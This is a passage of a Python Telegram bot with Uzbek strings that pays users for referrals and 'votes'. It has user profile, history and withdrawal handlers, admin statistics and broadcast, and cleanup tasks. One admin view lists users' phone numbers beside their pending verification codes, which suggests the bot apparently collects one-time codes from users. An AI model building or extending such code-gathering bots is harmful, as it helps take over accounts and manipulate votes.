                    f"💰 {withdraw['amount']:,} so'm balansga qaytarildi.",
                    reply_markup=get_user_menu()
                )
            except:
                pass
            
            await callback.message.edit_text(
                f"❌ <b>RAD ETILDI!</b>\n\n"
                f"👤 ID: {telegram_id}\n"
                f"💰 Summa: {withdraw['amount']:,} so'm"
            )
            await callback.answer("❌ Rad etildi!")
            
        except Exception as e:
            logger.error(f"❌ Xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
        finally:
            if conn:
                await conn.close()

# ================= 11. REFERALLAR =================
@dp.message(F.text == "👥 Referallar")
async def show_referrals(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz")
        return
    
    user = await get_user(telegram_id)
    
    if not user:
        await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
        return
    
    ref_count = await get_referral_count(telegram_id)
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
    
    await message.answer(
        f"👥 <b>REFERRAL TIZIMI</b>\n\n"
        f"🔗 <b>Sizning referal link:</b>\n"
        f"<code>{ref_link}</code>\n\n"
        f"👤 <b>Referallar soni:</b> {ref_count}\n"
        f"🎯 <b>Yechish uchun kerak:</b> {MIN_REFERRALS} ta\n\n"
        f"📤 Linkni do'stlaringizga yuboring!\n"
        f"{MIN_REFERRALS} ta do'stingiz start bossa, pul yechib olasiz"
    )

# ================= 12. TRANZAKSIYALAR TARIXI =================
@dp.message(F.text == "📜 Tarix")
async def show_history(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz")
        return
    
    conn = None
    try:
        conn = await get_db()
        transactions = await conn.fetch(
            "SELECT * FROM transactions WHERE telegram_id = $1 ORDER BY id DESC LIMIT 10",
            telegram_id
        )
        
        if transactions:
            text = "📜 <b>TRANZAKSIYALAR TARIXI:</b>\n\n"
            for trans in transactions:
                sign = "+" if trans['type'] == 'deposit' else "-"
                emoji = "✅" if trans['type'] == 'deposit' else "❌"
                text += f"{emoji} {sign}{trans['amount']:,} so'm\n"
                text += f"📝 {trans['description'] or 'Tranzaksiya'}\n"
                text += f"📅 {trans['created_at'].strftime('%Y-%m-%d %H:%M')}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text)
        else:
            await message.answer("📭 Tranzaksiyalar yo'q")
    except Exception as e:
        logger.error(f"❌ Tarix xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")
    finally:
        if conn:
            await conn.close()

# ================= 13. PROFIL =================
@dp.message(F.text == "👤 Profil")
async def show_profile(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz")
        return
    
    user = await get_user(telegram_id)
    
    if not user:
        await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
        return
    
    ref_count = await get_referral_count(telegram_id)
    phone_verified = await is_phone_verified(user['phone']) if user['phone'] != "no_phone_yet" else False
    
    status_text = "✅ Tasdiqlangan" if phone_verified else "⏳ Kutilmoqda"
    
    created_date = "Noma'lum"
    if user.get('created_at'):
        try:
            created_date = user['created_at'].strftime('%Y-%m-%d %H:%M')
        except:
            created_date = "Noma'lum"
    
    await message.answer(
        f"👤 <b>PROFIL</b>\n\n"
        f"🆔 ID: <code>{telegram_id}</code>\n"
        f"📱 Telefon: {user['phone']}\n"
        f"📊 Holat: {status_text}\n"
        f"💰 Balans: {user['balance']:,} so'm\n"
        f"👥 Referallar: {ref_count} ta\n"
        f"📅 Ro'yxatdan o'tgan: {created_date}",
        reply_markup=get_user_menu()
    )

# ================= 14. ADMIN STATISTIKA =================
@dp.message(F.text == "📊 Statistika")
async def admin_stats(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = None
    try:
        conn = await get_db()
        
        total_users = await conn.fetchval("SELECT COUNT(*) FROM users")
        registered_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE phone != 'no_phone_yet'")
        unregistered_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE phone = 'no_phone_yet'")
        blocked_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE is_blocked = TRUE")
        pending = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'pending_verify'")
        verified = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
        verified_phones = await conn.fetchval("SELECT COUNT(*) FROM verified_phones")
        total_balance = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users")
        pending_withdraws = await conn.fetchval("SELECT COUNT(*) FROM withdraws WHERE status = 'pending'")
        completed_withdraws = await conn.fetchval("SELECT COUNT(*) FROM withdraws WHERE status = 'completed'")
        total_withdrawn = await conn.fetchval("SELECT COALESCE(SUM(amount), 0) FROM withdraws WHERE status = 'completed'")
        total_referrals = await conn.fetchval("SELECT COUNT(*) FROM referrals")
        
        await message.answer(
            f"📊 <b>STATISTIKA</b>\n\n"
            f"👥 <b>Foydalanuvchilar:</b>\n"
            f"  • Jami: {total_users}\n"
            f"  • Ro'yxatdan o'tgan: {registered_users}\n"
            f"  • Telefon kiritmagan: {unregistered_users}\n"
            f"  • Bloklangan: {blocked_users}\n\n"
            f"📱 <b>Raqamlar:</b>\n"
            f"  • Tasdiqlangan: {verified_phones}\n\n"
            f"🔑 <b>Kodlar:</b>\n"
            f"  • Kutayotgan: {pending}\n"
            f"  • Tasdiqlangan: {verified}\n\n"
            f"💰 <b>Moliyaviy:</b>\n"
            f"  • Jami balans: {total_balance:,} so'm\n"
            f"  • Yechilgan: {total_withdrawn:,} so'm\n"
            f"  • Kutayotgan yechish: {pending_withdraws} ta\n"
            f"  • Yakunlangan yechish: {completed_withdraws} ta\n\n"
            f"👥 <b>Referallar:</b> {total_referrals} ta"
        )
    except Exception as e:
        logger.error(f"❌ Statistika xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")
    finally:
        if conn:
            await conn.close()

# ================= 15. KUTAYOTGAN KODLAR =================
@dp.message(F.text == "📋 Kutayotgan kodlar")
async def pending_codes(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = None
    try:
        conn = await get_db()
        codes = await conn.fetch(
            "SELECT * FROM codes WHERE status = 'pending_verify' AND expires_at > NOW() ORDER BY id DESC LIMIT 20"
        )
        
        if codes:
            text = "📋 <b>KUTAYOTGAN KODLAR:</b>\n\n"
            for c in codes:
                text += f"👤 ID: <code>{c['telegram_id']}</code>\n"
                text += f"📞 Tel: <code>{c['phone']}</code>\n"
                text += f"🔑 Kod: <code>{c['code']}</code>\n"
                text += f"⏳ Yaratilgan: {c['created_at'].strftime('%H:%M:%S')}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text)
        else:
            await message.answer("📭 Kutayotgan kodlar yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi!")
    finally:
        if conn:
            await conn.close()

# ================= 16. YECHISH SO'ROVLARI =================
@dp.message(F.text == "💸 Yechish so'rovlari")
async def pending_withdraws(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = None
    try:
        conn = await get_db()
        withdraws = await conn.fetch(
            "SELECT * FROM withdraws WHERE status = 'pending' ORDER BY id DESC LIMIT 20"
        )
        
        if withdraws:
            text = "💸 <b>YECHISH SO'ROVLARI:</b>\n\n"
            for w in withdraws:
                text += f"👤 ID: <code>{w['telegram_id']}</code>\n"
                text += f"📱 Ma'lumot: <code>{w['phone']}</code>\n"
                text += f"💰 Summa: <code>{w['amount']:,} so'm</code>\n"
                text += f"📅 Vaqt: {w['created_at'].strftime('%Y-%m-%d %H:%M')}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text)
        else:
            await message.answer("📭 Yechish so'rovlari yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi!")
    finally:
        if conn:
            await conn.close()

# ================= 17. TASDIQLANGAN RAQAMLAR =================
@dp.message(F.text == "✅ Tasdiqlangan raqamlar")
async def verified_phones_list(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = None
    try:
        conn = await get_db()
        phones = await conn.fetch(
            "SELECT * FROM verified_phones ORDER BY id DESC LIMIT 50"
        )
        
        if phones:
            text = "✅ <b>TASDIQLANGAN RAQAMLAR:</b>\n\n"
            for p in phones:
                text += f"📞 {p['phone']}\n"
                text += f"👤 ID: {p['telegram_id']}\n"
                text += f"📅 Vaqt: {p['verified_at'].strftime('%Y-%m-%d %H:%M')}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text)
        else:
            await message.answer("📭 Tasdiqlangan raqamlar yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi!")
    finally:
        if conn:
            await conn.close()

# ================= 18. FOYDALANUVCHILAR =================
@dp.message(F.text == "👥 Foydalanuvchilar")
async def users_list(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = None
    try:
        conn = await get_db()
        users = await conn.fetch(
            "SELECT telegram_id, phone, balance, is_blocked, created_at FROM users ORDER BY id DESC LIMIT 30"
        )
        
        if users:
            text = "👥 <b>FOYDALANUVCHILAR:</b>\n\n"
            for u in users:
                status = "❌ Bloklangan" if u['is_blocked'] else "✅ Faol"
                text += f"🆔 ID: <code>{u['telegram_id']}</code>\n"
                text += f"📞 Tel: {u['phone']}\n"
                text += f"💰 Balans: {u['balance']:,} so'm\n"
                text += f"📊 Holat: {status}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text)
        else:
            await message.answer("📭 Foydalanuvchilar yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi!")
    finally:
        if conn:
            await conn.close()

# ================= 19. BARCHAGA XABAR =================
@dp.message(F.text == "📨 Barchaga xabar")
async def broadcast_start(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    admin_states[ADMIN_ID] = "waiting_message"
    await message.answer(
        "📨 Xabar matnini yozing:\n"
        "❌ Bekor qilish uchun 'Bekor' deb yozing."
    )

@dp.message(lambda message: message.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
async def broadcast_send(message: types.Message):
    text = message.text
    
    if text.lower() == "bekor":
        admin_states.pop(ADMIN_ID, None)
        await message.answer("✅ Bekor qilindi", reply_markup=get_admin_menu())
        return
    
    admin_states.pop(ADMIN_ID, None)
    
    conn = None
    try:
        conn = await get_db()
        users = await conn.fetch("SELECT telegram_id FROM users WHERE is_blocked = FALSE")
        
        sent = 0
        failed = 0
        
        status_msg = await message.answer(f"📨 Yuborilmoqda... 0/{len(users)}")
        
        for i, user in enumerate(users, 1):
            try:
                await bot.send_message(user['telegram_id'], f"📨 <b>XABAR</b>\n\n{text}")
                sent += 1
            except Exception as e:
                failed += 1
                logger.error(f"❌ Xabar yuborishda xatolik ({user['telegram_id']}): {e}")
            
            if i % 10 == 0:
                try:
                    await status_msg.edit_text(f"📨 Yuborilmoqda... {i}/{len(users)}")
                except:
                    pass
            
            await asyncio.sleep(0.05)
        
        await status_msg.edit_text(
            f"✅ Yuborildi: {sent} ta\n"
            f"❌ Xatolik: {failed} ta\n"
            f"📊 Jami: {len(users)} ta",
            reply_markup=get_admin_menu()
        )
    except Exception as e:
        logger.error(f"❌ Broadcast xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi!")
    finally:
        if conn:
            await conn.close()

# ================= 20. BALANS KOMANDASI =================
@dp.message(Command("balance"))
async def check_balance(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        return
    
    user = await get_user(message.from_user.id)
    
    if not user:
        await message.answer("❌ Ro'yxatdan o'tmagansiz. /start")
        return
    
    if user['phone'] == "no_phone_yet":
        await message.answer(
            "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
            "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
            reply_markup=get_user_menu()
        )
        return
    
    await message.answer(f"💰 Balans: {user['balance']:,} so'm", reply_markup=get_user_menu())

# ================= 21. ADMIN MENU =================
@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("👋 Admin panel", reply_markup=get_admin_menu())

# ================= TOZALASH VAZIFALARI =================
async def cleanup_expired_codes():
    while True:
        try:
            conn = await get_db()
            await conn.execute(
                "UPDATE codes SET status = 'expired' WHERE status IN ('pending', 'pending_verify') AND expires_at < NOW()"
            )
            await conn.close()
            logger.info("✅ Eskirgan kodlar tozalandi")
        except Exception as e:
            logger.error(f"❌ Tozalash xatosi: {e}")
        await asyncio.sleep(60)

async def check_expired_withdraws():
    while True:
        try:
            conn = await get_db()
            expired_withdraws = await conn.fetch(
                "SELECT * FROM withdraws WHERE status = 'pending' AND created_at < NOW() - INTERVAL '24 hours'"
            )
            
            for withdraw in expired_withdraws:
                await conn.execute(
                    "UPDATE withdraws SET status = 'rejected', processed_at = CURRENT_TIMESTAMP WHERE id = $1",
                    withdraw['id']
                )
                
                await conn.execute(
                    "UPDATE users SET balance = balance + $1 WHERE telegram_id = $2",
                    withdraw['amount'], withdraw['telegram_id']
                )
                
                try:
                    await bot.send_message(
                        withdraw['telegram_id'],
                        f"❌ Yechish so'rovingiz avtomatik rad etildi!\n"
                        f"💰 {withdraw['amount']:,} so'm balansga qaytarildi.\n"
                        f"📝 Sabab: 24 soat ichida admin tomonidan tasdiqlanmadi.",
                        reply_markup=get_user_menu()
                    )
                except:
                    pass
            
            await conn.close()
        except Exception as e:
            logger.error(f"❌ Yechish tekshirish xatosi: {e}")
        await asyncio.sleep(300)

# ================= HTTP SERVER (RENDER UCHUN) =================
async def health_check(request):
    return web.Response(text="Bot is running!")

async def start_http_server():
    try:
        app = web.Application()
        app.router.add_get('/', health_check)
        app.router.add_get('/health', health_check)
        
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(runner, '0.0.0.0', PORT)
        await site.start()
        logger.info(f"🌐 HTTP server port {PORT} da ishga tushdi")
        
        while True:
            await asyncio.sleep(3600)
    except Exception as e:
        logger.error(f"❌ HTTP server xatosi: {e}")

# ================= KEEP-ALIVE =================
async def keep_alive():
    while True:
        try:
            await bot.get_me()
            logger.info("📡 Ping yuborildi")
        except Exception as e:
            logger.error(f"❌ Ping xatosi: {e}")
        await asyncio.sleep(60)

# ================= MAIN =================
async def main():
    logger.info("🤖 Bot ishga tushmoqda...")
    
    try:
        await init_db()
    except Exception as e:
        logger.error(f"❌ Database init xatosi: {e}")
        return
    
    asyncio.create_task(cleanup_expired_codes())
    asyncio.create_task(check_expired_withdraws())
    asyncio.create_task(start_http_server())
    asyncio.create_task(keep_alive())
    
    logger.info("✅ Bot tayyor!")
    
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"❌ Bot xatosi: {e}")
    finally:
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("👋 Bot to'xtatildi")
    except Exception as e:
        logger.error(f"❌ Kutilmagan xatolik: {e}")
